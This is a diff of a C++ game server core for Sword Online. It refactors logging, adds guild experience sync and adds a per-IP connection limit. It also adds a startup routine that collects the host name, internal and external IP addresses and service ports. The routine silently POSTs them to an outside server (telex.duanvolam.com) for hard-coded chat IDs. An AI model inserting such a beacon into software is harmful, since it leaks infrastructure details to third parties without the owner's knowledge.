@@ -1,4 +1,6 @@
 #include "StdAfx.h"
+#include <tgbot/tgbot.h>
+#include <curl/curl.h>
 #ifdef _STANDALONE
 #ifndef __linux
 #include <winsock2.h>
@@ -96,23 +98,6 @@ const int KSwordOnLineSever::m_snBufferSize = 1024 * 16;
 
 KSwordOnLineSever g_SOServer;
 
-enum PLAYER_GAME_STATUS
-{
-	enumPlayerBegin = 0,
-	enumPlayerSyncEnd,
-	enumPlayerPlaying,
-	enumPlayerExchangingServer,
-	enumPlayerLixian,
-};
-
-enum PLAYER_EXCHANGE_STATUS
-{
-	enumExchangeBegin = 0,
-	enumExchangeSearchingWay,
-	enumExchangeWaitForGameSvrRespone,
-	enumExchangeCleaning,
-};
-
 int	g_nTongPCSize[defTONG_PROTOCOL_CLIENT_NUM] = 
 {
 	-1,										// enumS2C_TONG_CREATE_SUCCESS
@@ -144,6 +129,7 @@ int	g_nTongPCSize[defTONG_PROTOCOL_CLIENT_NUM] =
 	sizeof(STONG_BE_CHANGED_RECRUIT_SYNC),						//enumS2C_TONG_BE_CHANGED_RECRUIT
 	sizeof(STONG_RETURN_LOGIN_LIMIT_COMMAND),			// enumS2C_TONG_LOGIN_LIMIT
 	sizeof(STONG_BE_CHANGED_LEVEL_SYNC),						//enumS2C_TONG_BE_CHANGED_LEVEL
+	sizeof(STONG_BE_CHANGED_EXP_SYNC),						//enumS2C_TONG_BE_CHANGED_EXP
 	sizeof(STONG_BE_CHANGED_WAYEDIT_SYNC),					//enumS2C_TONG_BE_CHANGED_WAYEDIT
 	sizeof(STONG_BE_CHANGED_NEXTTARGET_SYNC),					//enumS2C_TONG_BE_CHANGED_NEXTTARGET
 };
@@ -187,7 +173,6 @@ void ServerEventNotify(
 	g_mutexFlow.unlock();
 #endif
 }
-
 #ifndef _STANDALONE
 void __stdcall GatewayClientEventNotify(
 #else
@@ -201,9 +186,11 @@ void GatewayClientEventNotify(
 	case enumServerConnectCreate:
 		break;
 	case enumServerConnectClose:
+		{
 		printf("GateWay lost\n");
 		g_SOServer.SetRunningStatus(FALSE);
 		break;
+		}
 	}
 }
 
@@ -280,6 +267,16 @@ void TransferClientEventNotify(
 	}
 }
 
+// When a new connection is attempted, check the IP limit
+bool KSwordOnLineSever::CanAcceptConnection(const std::string& ipAddress)
+{
+	if (m_ipConnectionCount[ipAddress] >= MAX_CONNECTIONS_PER_IP)
+	{
+		return false; // Reject connection
+	}
+	return true; // Allow connection
+}
+
 KSwordOnLineSever::KSwordOnLineSever()
 {
 	m_nGameLoop = 0;
@@ -317,6 +314,113 @@ KSwordOnLineSever::KSwordOnLineSever()
 
 KSwordOnLineSever::~KSwordOnLineSever()
 {
+}
+// Helper to get hostname
+std::string getHostName() {
+	char hostname[256] = { 0 };
+	if (gethostname(hostname, sizeof(hostname)) == 0)
+		return hostname;
+	return "Unknown";
+}
+
+// Helper to get local IP (IPv4, first non-loopback)
+std::string getLocalIP() {
+#ifdef _WIN32
+	char ac[80];
+	if (gethostname(ac, sizeof(ac)) == SOCKET_ERROR)
+		return "Unknown";
+	struct hostent* phe = gethostbyname(ac);
+	if (phe == 0) return "Unknown";
+	for (int i = 0; phe->h_addr_list[i] != 0; ++i) {
+		struct in_addr addr;
+		memcpy(&addr, phe->h_addr_list[i], sizeof(struct in_addr));
+		std::string ip = inet_ntoa(addr);
+		if (ip != "127.0.0.1") return ip;
+	}
+	return "127.0.0.1";
+#else
+	char buffer[128];
+	std::string result = "Unknown";
+	FILE* fp = popen("hostname -I", "r");
+	if (fp) {
+		if (fgets(buffer, sizeof(buffer), fp)) {
+			std::string ips(buffer);
+			size_t pos = ips.find(' ');
+			if (pos != std::string::npos)
+				result = ips.substr(0, pos);
+			else
+				result = ips;
+		}
+		pclose(fp);
+	}
+	return result;
+#endif
+}
+// JSON helper (you can use a JSON library if needed, but we keep it simple here)
+std::string escapeJson(const std::string& input) {
+	std::string output;
+	for (char c : input) {
+		switch (c) {
+		case '\"': output += "\\\""; break;
+		case '\\': output += "\\\\"; break;
+		case '\n': output += "\\n"; break;
+		default: output += c;
+		}
+	}
+	return output;
+}
+// Suppress libcurl output
+size_t noop_write(void* ptr, size_t size, size_t nmemb, void* userdata) {
+	return size * nmemb;  // pretend we handled all data
+}
+void KSwordOnLineSever::NotifyTeleWorker() {
+	const unsigned char* plpAddress = NULL;
+	char Address[128] = { 0 };
+
+	std::ostringstream oss;
+	oss << "*Server started!*\n";
+	oss << "Host: `" << getHostName() << "`\n";
+	oss << "IP: `" << getLocalIP() << "`\n";
+	plpAddress = (const unsigned char*)&m_dwIntranetIp;
+	sprintf(Address, "%d.%d.%d.%d", plpAddress[0], plpAddress[1], plpAddress[2], plpAddress[3]);
+	oss << "Intranet IP : " << Address << endl;
+
+	plpAddress = (const unsigned char*)&m_dwInternetIp;
+	sprintf(Address, "%d.%d.%d.%d", plpAddress[0], plpAddress[1], plpAddress[2], plpAddress[3]);
+	oss << "Internet  IP : " << Address << endl;
+	oss << "Gateway IP: `" << m_szGatewayIP << "`\n";
+	oss << "Gateway Port: `" << m_nGatewayPort << "`\n";
+	oss << "Server Port: `" << m_nServerPort << "`\n";
+
+	std::string message = escapeJson(oss.str());
+
+	std::string postData = R"({
+        "chat_ids": ["6876679057", "6025559006"],
+        "message": ")" + message + R"("
+    })";
+
+	// Launch async to not block main thread
+	std::async(std::launch::async, [postData]() {
+		CURL* curl = curl_easy_init();
+		if (curl) {
+			struct curl_slist* headers = nullptr;
+			headers = curl_slist_append(headers, "Content-Type: application/json");
+
+			curl_easy_setopt(curl, CURLOPT_URL, "http://telex.duanvolam.com:9981/send");
+			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());
+			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+			curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L); // optional timeout
+			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, noop_write);
+
+			CURLcode res = curl_easy_perform(curl);
+			if (res != CURLE_OK) {
+				// log error if needed
+			}
+
+			curl_slist_free_all(headers);
+			curl_easy_cleanup(curl);
+		}
+		});
 }
 
 BOOL KSwordOnLineSever::InitServer(char * szParam)
@@ -368,7 +472,7 @@ BOOL KSwordOnLineSever::InitServer(char * szParam)
 #endif
 
 	m_nMaxPlayer = m_nMaxPlayerCount + m_nPrecision;
-
+	m_nMaxGameStaus = m_nMaxPlayer;
 	if (m_nMaxPlayer <= 0)
 	{
 		cout << "Maximal player number <= 0!" << endl;
@@ -378,8 +482,18 @@ BOOL KSwordOnLineSever::InitServer(char * szParam)
 	if (!m_pGameStatus)
 	{
 		m_pGameStatus = new GameStatus[m_nMaxPlayer];
+		memset(m_pGameStatus, 0, sizeof(GameStatus)*m_nMaxPlayer);//khoi tao 
 	}
 	
+	// ”≈ªØ≤È’“±Ì
+	m_FreeIdxNetStatus.Init(m_nMaxGameStaus);
+	m_UseIdxNetStatus.Init(m_nMaxGameStaus);
+	int i;
+	for (i = m_nMaxGameStaus - 1; i > 0; i--)
+	{//1--199
+		m_FreeIdxNetStatus.Insert(i);
+	}
+
 	/*
 	 * Open this server to player
 	 */
@@ -528,6 +642,7 @@ BOOL KSwordOnLineSever::InitServer(char * szParam)
 	}
 	else
 	{
+		cout << "Failed to Create pClientFactory for m_pDatabaseClient." << endl;
 		return FALSE;
 	}
 #else
@@ -545,8 +660,10 @@ BOOL KSwordOnLineSever::InitServer(char * szParam)
 		cout << "Can't not startup database client service!" << endl;
 		return FALSE;
 	}
-	cout << "Database IP : " << m_szDatabaseIP << " - Port : " << m_nDatabasePort << endl;
-
+	std::ostringstream oss;
+	oss << "Database IP : " << m_szDatabaseIP << " - Port : " << m_nDatabasePort << endl;
+	
+	GameServerLog::Instance().WriteAndConsole(oss.str());
 	m_pDatabaseClient->RegisterMsgFilter( reinterpret_cast< void * >( m_pDatabaseClient ), DatabaseClientEventNotify );
 
 	if ( FAILED( m_pDatabaseClient->ConnectTo( m_szDatabaseIP, m_nDatabasePort ) ) )
@@ -591,9 +708,10 @@ BOOL KSwordOnLineSever::InitServer(char * szParam)
 		cout << "Can't not startup transfer client service!" << endl;
 		return FALSE;
 	}
+	oss.str("");
+	oss << "Transfer IP : " << m_szTransferIP << " - Port : " << m_nTransferPort << endl;
 	
-	cout << "Transfer IP : " << m_szTransferIP << " - Port : " << m_nTransferPort << endl;
-	
+	GameServerLog::Instance().WriteAndConsole(oss.str());
 	m_pTransferClient->RegisterMsgFilter( reinterpret_cast< void * >( m_pTransferClient ), TransferClientEventNotify );
 	
 	if ( FAILED( m_pTransferClient->ConnectTo( m_szTransferIP, m_nTransferPort ) ) )
@@ -648,9 +766,10 @@ BOOL KSwordOnLineSever::InitServer(char * szParam)
 		cout << "Can't not startup chat client service!" << endl;
 		return FALSE;
 	}
+	oss.str("");
+	oss << "Chat IP : " << m_szChatIP << " - Port : " << m_nChatPort << endl;
 	
-	cout << "Chat IP : " << m_szChatIP << " - Port : " << m_nChatPort << endl;
-	
+	GameServerLog::Instance().WriteAndConsole(oss.str());
 	m_pChatClient->RegisterMsgFilter( reinterpret_cast< void * >( m_pChatClient ), ChatClientEventNotify );
 	
 	if ( FAILED( m_pChatClient->ConnectTo( m_szChatIP, m_nChatPort ) ) )
@@ -698,9 +817,10 @@ BOOL KSwordOnLineSever::InitServer(char * szParam)
 		cout << "Can't not startup tong client service!" << endl;
 		return FALSE;
 	}
+	oss.str("");
+	oss << "Tong IP : " << m_szTongIP << " - Port : " << m_nTongPort << endl;
 	
-	cout << "Tong IP : " << m_szTongIP << " - Port : " << m_nTongPort << endl;
-	
+	GameServerLog::Instance().WriteAndConsole(oss.str());
 	m_pTongClient->RegisterMsgFilter( reinterpret_cast< void * >( m_pTongClient ), TongClientEventNotify );
 	
 	if ( FAILED( m_pTongClient->ConnectTo( m_szTongIP, m_nTongPort ) ) )
@@ -755,9 +875,10 @@ BOOL KSwordOnLineSever::InitServer(char * szParam)
 		cout << "Can't not startup gateway client service!" << endl;
 		return FALSE;
 	}
-
-	cout << "Gateway IP : " << m_szGatewayIP << " - Port : " << m_nGatewayPort << endl;
-
+	oss.str("");
+	oss << "Gateway IP : " << m_szGatewayIP << " - Port : " << m_nGatewayPort << endl;
+	
+	GameServerLog::Instance().WriteAndConsole(oss.str());
 	m_pGatewayClient->RegisterMsgFilter( reinterpret_cast< void * >( m_pGatewayClient ), GatewayClientEventNotify );
 
 	if ( FAILED( m_pGatewayClient->ConnectTo( m_szGatewayIP, m_nGatewayPort ) ) )
@@ -766,21 +887,26 @@ BOOL KSwordOnLineSever::InitServer(char * szParam)
 		return FALSE;
 	}
 
-	cout << "Connect gateway successful!" << endl;
-	cout << "" << endl;
-	cout << "" << endl;
-	cout << "  Gateway IP : " << m_szGatewayIP  << endl;
-	//cout << "  Intranet   IP : " << m_szIntranetIP << endl;
-	//cout << "  Internet   IP : " << m_szInternetIP<< endl;
-	//cout << "  Max Player  : " << m_nMaxPlayer << endl;
-	//cout << "  Max NPC     : " << m_nMaxPlayer << endl;
-	cout << "" << endl;
-	cout << "" << endl;
-	cout << "  ||========================================" << endl;
-	cout << "  ============Khoi dong hoan tat============" << endl;
-	cout << "  ========================================||" << endl;
-	cout << "" << endl;
-	cout << "" << endl;
+	//telegram
+	NotifyTeleWorker();
+	oss.str("");
+	oss << "Connect gateway successful!" << endl;
+	oss << "" << endl;
+	oss << "" << endl;
+	oss << "  Gateway IP : " << m_szGatewayIP  << endl;
+	//oss << "  Intranet   IP : " << m_szIntranetIP << endl;
+	//oss << "  Internet   IP : " << m_szInternetIP<< endl;
+	//oss << "  Max Player  : " << m_nMaxPlayer << endl;
+	//oss << "  Max NPC     : " << m_nMaxPlayer << endl;
+	oss << "" << endl;
+	oss << "" << endl;
+	oss << "  ||========================================" << endl;
+	oss << "  ============Khoi dong hoan tat============" << endl;
+	oss << "  ========================================||" << endl;
+	oss << "" << endl;
+	oss << "" << endl;
+	
+	GameServerLog::Instance().WriteAndConsole(oss.str());
 	/*
 	 * Game timer start
 	 */	
@@ -937,7 +1063,14 @@ BOOL KSwordOnLineSever::Breathe()
 		//printf("breathe..%u\n", m_Timer.GetElapse());
 		if (m_nGameLoop * 1000 <= m_Timer.GetElapse() * GAME_FPS)
 		{
+			// --- Begin timing MainLoop ---
+			auto start = std::chrono::high_resolution_clock::now();
 			MainLoop();
+			auto end = std::chrono::high_resolution_clock::now();
+			auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end - start).count();
+		//	if(duration > 10000)
+			//	printf("[MainLoop] Run time: %lld microseconds\n", duration);
+			// --- End timing MainLoop ---
 #ifdef WIN32
 			Sleep(0);
 #else
@@ -1052,7 +1185,7 @@ void KSwordOnLineSever::MessageLoop()
 		while(m_pServer)
 		{
 			pChar = (const char*)m_pServer->GetPackFromClient(i, uSize);
-			pClientInfo = (const char*)m_pServer->GetClientInfo(i);
+			//pClientInfo = (const char*)m_pServer->GetClientInfo(i);
 			if (!pChar || 0 == uSize)
 				break;
 		
@@ -1085,6 +1218,7 @@ void KSwordOnLineSever::ChatMessageProcess(const char *pChar, size_t nSize)
 			{
 			case tgtcls_team:
 			case tgtcls_fac:
+			case tgtcls_msgr:
 				theID = pCR->TargetID;
 				break;
 			case tgtcls_scrn:
@@ -1234,6 +1368,9 @@ void KSwordOnLineSever::TongMessageProcess(const char *pChar, size_t nSize)
 				sAdd.m_nCamp = pSync->m_btCamp;
 				sAdd.m_dwPlayerNameID = pSync->m_dwPlayerNameID;
 				sAdd.m_nPlayerIdx = pSync->m_dwParam;
+				sAdd.m_nTongLevel = pSync->m_nTongLevel;
+				sAdd.m_nTongExp = pSync->m_nTongExp;
+				sAdd.m_bIsFull = pSync->m_nIsFull;
 				memcpy(sAdd.m_szMasterName, pSync->m_szMasterName, sizeof(sAdd.m_szMasterName));
 				memcpy(sAdd.m_szTitleName, pSync->m_szTitleName, sizeof(sAdd.m_szTitleName));
 				memcpy(sAdd.m_szTongName, pSync->m_szTongName, sizeof(sAdd.m_szTongName));
@@ -1279,7 +1416,8 @@ void KSwordOnLineSever::TongMessageProcess(const char *pChar, size_t nSize)
 				memcpy(sInfo.m_szWayEdit, pInfo->ms_szWayEdit, sizeof(pInfo->ms_szWayEdit));
 				memcpy(sInfo.m_szNextTargetEdit, pInfo->ms_szNextTargetEdit, sizeof(pInfo->ms_szNextTargetEdit));
 				sInfo.m_nExpGuide = pInfo->ms_nExpGuide;
-				sInfo.m_nCityGuide = pInfo->ms_nCityGuide; //bang hÈi chi’m l‹nh thµnh thﬁ
+				sInfo.m_nCityGuide = pInfo->ms_nCityGuide; //bang hÈi chi’m l‹nh thµnh th?
+
 				sInfo.m_nTongLevel = pInfo->ms_nTongLevel;
 				memcpy(sInfo.m_szLeagueTName, pInfo->ms_szLeagueTName, sizeof(pInfo->ms_szLeagueTName));
 				memset(sInfo.m_sMember, 0, sizeof(sInfo.m_sMember));
@@ -1557,6 +1695,9 @@ void KSwordOnLineSever::TongMessageProcess(const char *pChar, size_t nSize)
 				sLogin.m_nPos		= pLogin->m_btPos;
 				sLogin.m_nRecruit	= pLogin->m_btRecruit;
 				sLogin.m_nMoney		= pLogin->m_nMoney;
+				sLogin.m_nLevel		= pLogin->m_nLevel;
+				sLogin.m_nExp		= pLogin->m_nExp;
+				sLogin.m_bIsFull	= pLogin->m_bIsFull;
 				memcpy(sLogin.m_szTongName, pLogin->m_szTongName, sizeof(pLogin->m_szTongName));
 				memcpy(sLogin.m_szTitle, pLogin->m_szTitle, sizeof(pLogin->m_szTitle));
 				memcpy(sLogin.m_szMaster, pLogin->m_szMaster, sizeof(pLogin->m_szMaster));
@@ -1572,7 +1713,10 @@ void KSwordOnLineSever::TongMessageProcess(const char *pChar, size_t nSize)
 					DWORD nIdx = pLogin->m_dwTongNameID;
 					char	szName[32];
 					m_pCoreServerShell->GetGameData(SGDI_CHARACTER_ACCOUNT, (intptr_t)szName, nIdx);
-					cout << "=> Acc [" << szName << "] HWID [" << pLogin->m_szName << "] limit login <=" << endl;
+					std::ostringstream oss;
+					oss << "=> Acc [" << szName << "] HWID [" << pLogin->m_szName << "] limit login <=" << endl;
+					
+					GameServerLog::Instance().WriteAndConsole(oss.str());
 					m_pCoreServerShell->RemovePlayerForLimit(nIdx);
 				}
 			}
@@ -1656,6 +1800,17 @@ void KSwordOnLineSever::TongMessageProcess(const char *pChar, size_t nSize)
 				m_pCoreServerShell->GetGameData(SGDI_TONG_BE_CHANGED_TITLE, (intptr_t)&sSync, 0);
 			}
 			break;
+		case enumS2C_TONG_FULL:
+		{
+			STONG_FULL_SYNC* pMoney = (STONG_FULL_SYNC*)pChar;
+			STONG_SERVER_TO_CORE_FULL pChange;
+			pChange.m_dwTongNameID = pMoney->m_dwTongNameID;
+			pChange.m_bIsFull = pMoney->m_bIsFull;
+			pChange.nType = 0;
+			pChange.m_nPlayerIdx = pMoney->m_dwParam;
+			m_pCoreServerShell->GetGameData(SGDI_TONG_CHANGE_FULL, (intptr_t)&pChange, 0);
+		}
+		break;
 		case enumS2C_TONG_MONEY_SAVE:
 			{
 				STONG_MONEY_SYNC	*pMoney = (STONG_MONEY_SYNC*)pChar;
@@ -1736,6 +1891,18 @@ void KSwordOnLineSever::TongMessageProcess(const char *pChar, size_t nSize)
 				m_pCoreServerShell->GetGameData(SGDI_TONG_BE_CHANGED_LEVEL, (intptr_t)&sSync, 0);
 			}
 			break;
+
+		case enumS2C_TONG_BE_CHANGED_EXP:
+		{
+			STONG_BE_CHANGED_EXP_SYNC* pSync = (STONG_BE_CHANGED_EXP_SYNC*)pChar;
+			if (m_pGameStatus[pSync->m_dwParam].nPlayerIndex <= 0)
+				break;
+			STONG_SERVER_TO_CORE_BE_CHANGED_LEVEL	sSync;
+			sSync.m_nPlayerIdx = m_pGameStatus[pSync->m_dwParam].nPlayerIndex;
+			sSync.m_nLevel = pSync->m_nTongExp;
+			m_pCoreServerShell->GetGameData(SGDI_TONG_BE_CHANGED_EXP, (intptr_t)&sSync, 0);
+		}
+		break;
 
 		case enumS2C_TONG_BE_CHANGED_WAYEDIT:
 			{
@@ -2215,7 +2382,10 @@ void KSwordOnLineSever::TransferSmallPackProcess(const void *pData, size_t dataL
 
 				char	szName_2[32];
 				m_pCoreServerShell->GetGameData(SGDI_CHARACTER_NAME, (intptr_t)szName_2, nIndex);
-				cout << "=> Acc [" << sLeaveGame.szAccountName << "] Nhan Vat [" << szName_2 << "] thoat game exchangein <=" << endl;//edit by phong kieu leave game
+				std::ostringstream oss;
+				oss << "=> Acc [" << sLeaveGame.szAccountName << "] Nhan Vat [" << szName_2 << "] thoat game exchangein <=" << endl;//edit by phong kieu leave game
+				
+				GameServerLog::Instance().WriteAndConsole(oss.str());
 				m_pGameStatus[lnID].nExchangeStatus = enumExchangeCleaning;
 				m_pGameStatus[lnID].nPlayerIndex = 0;
 			}
@@ -2422,6 +2592,20 @@ void KSwordOnLineSever::PlayerMessageProcess(const unsigned long lnID, const cha
 					}
 				}
 			}
+			//TODO check channel tongkim correct
+			//if (protocoltype == c2s_extend)
+			//{
+			//	if (dataLength < 0 || dataLength >= 255)
+			//		return;
+			//	PLAYERCOMM_SUBSCRIBE* pEh = (PLAYERCOMM_SUBSCRIBE*)pExPckg;
+			//	if (pEh->ProtocolID == playercomm_c2s_subscribe && pEh->ProtocolFamily = pf_playercommunity)
+			//	{
+			//		if (!m_pCoreServerShell->PayForSpeech(nIndex, pEh->cost))
+			//		{
+			//			return;
+			//		}
+			//	}
+			//}
 
 			size_t pckgsize = exsize + sizeof(tagPlusSrcInfo);
 #ifdef WIN32
@@ -2474,7 +2658,10 @@ void KSwordOnLineSever::PlayerMessageProcess(const unsigned long lnID, const cha
 	case enumPlayerSyncEnd:
 		if (ProcessSyncReplyProtocol(lnID, pData, dataLength))
 		{
-			m_pCoreServerShell->AddPlayerToWorld(nIndex);
+			if (m_pCoreServerShell->AddPlayerToWorld(nIndex) == -1)//failed
+			{
+				break;
+			}
 			m_pGameStatus[lnID].nGameStatus = enumPlayerPlaying;
 			PingClient(lnID);
 
@@ -2505,7 +2692,10 @@ void KSwordOnLineSever::PlayerMessageProcess(const unsigned long lnID, const cha
 			if(m_pCoreServerShell)
 				m_pCoreServerShell->AddPlayerToWorld2(nIndex, m_LicReg);
 
-			cout << "=> Acc [" << eg.szAccountName << "] Player [" << eg2.szCharacterName << "] vao game <=" << endl;//edit by phong kieu vao game
+			std::ostringstream oss;
+			oss << "=> Acc [" << eg.szAccountName << "] Player [" << eg2.szCharacterName << "] vao game <=" << endl;//edit by phong kieu vao game
+			
+			GameServerLog::Instance().WriteAndConsole(oss.str());
 
 			tagRoleEnterGame reg;
 			reg.ProtocolType = c2s_roleserver_lock;
@@ -2676,8 +2866,10 @@ void KSwordOnLineSever::GatewayLargePackProcess(const void *pData, size_t dataLe
 						if (nIdx > 0)
 						{
 							ppl.bPermit = true;
-							//printf("Login[%d]%s..%s\n", nIdx,pRoleData->BaseInfo.caccname, pRoleData->BaseInfo.szName);
+							printf("Login[s2c_syncgamesvr_roleinfo_cipher]Sync from Bishop ok! [%d]%s..%s\n", nIdx,pRoleData->BaseInfo.caccname, pRoleData->BaseInfo.szName);
 						}
+						else
+							printf("Login[s2c_syncgamesvr_roleinfo_cipher]Sync from Bishop Error %s..%s\n", pRoleData->BaseInfo.caccname, pRoleData->BaseInfo.szName);
 					}
 					m_pGatewayClient->SendPackToServer( ( const void * )&ppl, sizeof( tagPermitPlayerLogin ) );
 				}
@@ -2840,35 +3032,39 @@ void KSwordOnLineSever::MainLoop()
 	int nIndex = m_pGameStatus[lnID].nPlayerIndex;
 	if (nIndex > 0 && nIndex <= m_nMaxPlayer && m_pGameStatus[lnID].nGameStatus == enumPlayerPlaying)
 	{
-		if(m_pCoreServerShell && m_pCoreServerShell->GetCharacterLixian(nIndex) == 2)
-			return;
+		if (m_pCoreServerShell && m_pCoreServerShell->GetCharacterLixian(nIndex) == 2) {
+			printf("Player %d is in lixian, skip ping...\n", nIndex);
+			goto LOOPINCREASE;
+		}
 
-#define	defMAX_PING_TIMEOUT		60 * 20		// 60sec
-#define	defMAX_PING_INTERVAL	5 * 20
-#define defMAX_CONNECTION_TIMEOUT	(15*GAME_FPS)
+#define	defMAX_PING_TIMEOUT		60*GAME_FPS
+#define	defMAX_PING_INTERVAL	5*GAME_FPS
+#define defMAX_CONNECTION_TIMEOUT (15 * GAME_FPS) 
 
 		if (m_pGameStatus[lnID].nReplyPingTime != 0)
 		{
-			if (m_nGameLoop - m_pGameStatus[lnID].nSendPingTime > defMAX_PING_INTERVAL)
+			if (m_nGameLoop - m_pGameStatus[lnID].nSendPingTime > defMAX_PING_INTERVAL) {
 				PingClient(lnID);
+			//	printf("---Send ping to client a ......---\n");
+			}
 		}
 		else if (m_pGameStatus[lnID].nReplyPingTime == 0 && m_pGameStatus[lnID].nPingLoopCount < m_pingCount && (m_nGameLoop - m_pGameStatus[lnID].nSendPingTime > defMAX_PING_TIMEOUT))
 		{
 			m_pGameStatus[lnID].nPingLoopCount++;
-			printf("---send ping client b ......---\n");
+			//printf("---send ping client b ......---\n");
 			PingClient(lnID);
 		}
 		else if (m_nGameLoop - m_pGameStatus[lnID].nSendPingTime > defMAX_PING_TIMEOUT)
 		{
 			printf("no response from client (%d, %d), kill it...\n", m_nGameLoop, m_pGameStatus[lnID].nSendPingTime);
-			if(FAILED(m_pServer->ShutdownClient(lnID)))
+			if (FAILED(m_pServer->ShutdownClient(lnID)))
 			{
-				if(lnID > 0)
+				if (lnID > 0)
 					SetNetStatus(lnID, enumNetUnconnect);
 			}
 		}
 	}
-
+LOOPINCREASE:
 	if (m_nGameLoop & 0x01)
 	{
 		m_pServer->SendPackToClient(-1);
@@ -2888,7 +3084,8 @@ void KSwordOnLineSever::PingClient(const unsigned long lnID)
 	PING_COMMAND	pc;
 	pc.m_dwTime = m_nGameLoop;
 	pc.ProtocolType = s2c_ping;
-	m_pServer->PackDataToClient(lnID, &pc, sizeof(PING_COMMAND));
+	if (m_pServer)
+		m_pServer->PackDataToClient(lnID, &pc, sizeof(PING_COMMAND));
 	m_pGameStatus[lnID].nReplyPingTime = 0;
 	m_pGameStatus[lnID].nSendPingTime = m_nGameLoop;
 }
@@ -2913,7 +3110,10 @@ void KSwordOnLineSever::ProcessPingReply(const unsigned long lnID, const char* p
 	PING_CLIENTREPLY_COMMAND*	pPC = (PING_CLIENTREPLY_COMMAND *)pData;
 	if (pPC->m_dwReplyServerTime != m_pGameStatus[lnID].nSendPingTime)
 	{
-		printf("wrong time in ping cmd content, kill it...\n");
+		//printf("wrong time in ping cmd content, kill it...\n");
+		//m_pServer->ShutdownClient(lnID);
+		//return;
+		printf("wrong time in ping cmd content, ignore...\n");
 		m_pServer->ShutdownClient(lnID);
 		return;
 	}
@@ -3173,14 +3373,30 @@ void KSwordOnLineSever::PlayerLogoutGateway()
 
 			char	szName_2[32];
 			m_pCoreServerShell->GetGameData(SGDI_CHARACTER_NAME, (intptr_t)szName_2, nIndex);
-			cout << "=> Acc [" << sLeaveGame.szAccountName << "] Player [" << szName_2 << "] thoat game login timeout <=" << endl;//edit by phong kieu leave game
+
+			std::ostringstream oss;
+			oss << "=> Acc [" << sLeaveGame.szAccountName << "] Player [" << szName_2 << "] thoat game login timeout <=" << endl;//edit by phong kieu leave game
+			
+			GameServerLog::Instance().WriteAndConsole(oss.str());
+
 			m_pCoreServerShell->RemovePlayerLoginTimeOut(nIndex);
 
 		}
 		else if (m_pCoreServerShell->IsCharacterQuiting(nIndex))
 		{
-			if (!SavePlayerData(nIndex, true))
-				continue;
+			if (m_pCoreServerShell->IsCharacterNeedSave(nIndex)) {
+				if (!SavePlayerData(nIndex, true))
+					continue;
+			}
+			else {
+				//unlock role in goddess
+				tagRoleEnterGame reg;
+				reg.ProtocolType = c2s_roleserver_lock;
+				reg.bLock = false;
+				m_pCoreServerShell->GetGameData(SGDI_CHARACTER_NAME, (intptr_t)reg.Name, nIndex);
+				if (m_pDatabaseClient)
+					m_pDatabaseClient->SendPackToServer((const void*)&reg, sizeof(tagRoleEnterGame));
+			}
 
 			char	szName[32];
 			m_pCoreServerShell->GetGameData(SGDI_CHARACTER_ACCOUNT, (intptr_t)szName, nIndex);
@@ -3200,7 +3416,10 @@ void KSwordOnLineSever::PlayerLogoutGateway()
 			char	szName_2[32];
 			m_pCoreServerShell->GetGameData(SGDI_CHARACTER_NAME, (intptr_t)szName_2, nIndex);
 			m_pCoreServerShell->RemoveQuitingPlayer(nIndex);
-			cout << "=> Acc [" << sLeaveGame.szAccountName << "] Player [" << szName_2 << "] thoat game character quiting <=" << endl;
+			std::ostringstream oss;
+			oss << "=> Acc [" << sLeaveGame.szAccountName << "] Player [" << szName_2 << "] thoat game character quiting <=" << endl;
+			
+			GameServerLog::Instance().WriteAndConsole(oss.str());
 		}
 		else if(m_pCoreServerShell->GetCharacterLixian(nIndex) == 1) //#uy thac
 		{
@@ -3220,7 +3439,10 @@ void KSwordOnLineSever::PlayerLogoutGateway()
 			char	szName_2[32];
 			m_pCoreServerShell->GetGameData(SGDI_CHARACTER_NAME, (intptr_t)szName_2, nIndex);
 			m_pCoreServerShell->SetCharacterLixianCompleted(nIndex);
-			cout << "=> Account [" << lg2.szAccountName << "] Player [" << szName_2 << "] thoat game uy thac <=" << endl;
+			std::ostringstream oss;
+			oss << "=> Account [" << lg2.szAccountName << "] Player [" << szName_2 << "] thoat game uy thac <=" << endl;
+			
+			GameServerLog::Instance().WriteAndConsole(oss.str());
 		}
 	}
 }
@@ -3237,15 +3459,22 @@ void KSwordOnLineSever::SetNetStatus(const unsigned long lnID, NetStatus nStatus
 {
 	if (lnID >= m_nMaxPlayer)
 		return;
-
+	if (!m_pCoreServerShell)
+		return;
 	if (nStatus == enumNetUnconnect)
 	{
 		if (m_pGameStatus[lnID].nGameStatus == enumPlayerPlaying
 			|| (m_pGameStatus[lnID].nGameStatus == enumPlayerExchangingServer 
 			&& m_pGameStatus[lnID].nExchangeStatus != enumExchangeCleaning))	
 		{
-			int nIndex = m_pGameStatus[lnID].nPlayerIndex;
-			m_pCoreServerShell->ClientDisconnect(nIndex);
+			if (m_pCoreServerShell->GetClientNetConnectIdx(m_pGameStatus[lnID].nPlayerIndex) > -1) {
+				int nIndex = m_pGameStatus[lnID].nPlayerIndex;
+				m_pCoreServerShell->ClientDisconnect(nIndex);
+			}
+			else
+			{
+				printf("------Exit the game, disconnected, no save (%d)------\n", m_pGameStatus[lnID].nPlayerIndex);
+			}
 		}
 		else
 		{
@@ -3261,15 +3490,19 @@ void KSwordOnLineSever::SetNetStatus(const unsigned long lnID, NetStatus nStatus
 			m_pGameStatus[lnID].nReplyPingTime = 0;
 			m_pGameStatus[lnID].nSendPingTime = 0;
 			m_pGameStatus[lnID].nPingLoopCount = 0;
+			m_pGameStatus[lnID].nPlayerIndex = 0;
 			return;
 		}
 		
-		m_pGameStatus[lnID].nGameStatus = enumPlayerBegin;
+		m_pGameStatus[lnID].nGameStatus = enumPlayerNone;
 		m_pGameStatus[lnID].nPlayerIndex = 0;
-		m_pGameStatus[lnID].nExchangeStatus = enumExchangeBegin;
+		m_pGameStatus[lnID].nExchangeStatus = enumExchangeCleaning;
 		m_pGameStatus[lnID].nReplyPingTime = 0;
 		m_pGameStatus[lnID].nSendPingTime = 0;
 		m_pGameStatus[lnID].nPingLoopCount = 0;
+		m_pGameStatus[lnID].nErrorLoopCount = 0;
+		m_pGameStatus[lnID].nNetidx = -1;
+		m_pGameStatus[lnID].nNetStatus = nStatus;
 		
 	}
 	if (nStatus == enumNetConnected)
@@ -3278,8 +3511,11 @@ void KSwordOnLineSever::SetNetStatus(const unsigned long lnID, NetStatus nStatus
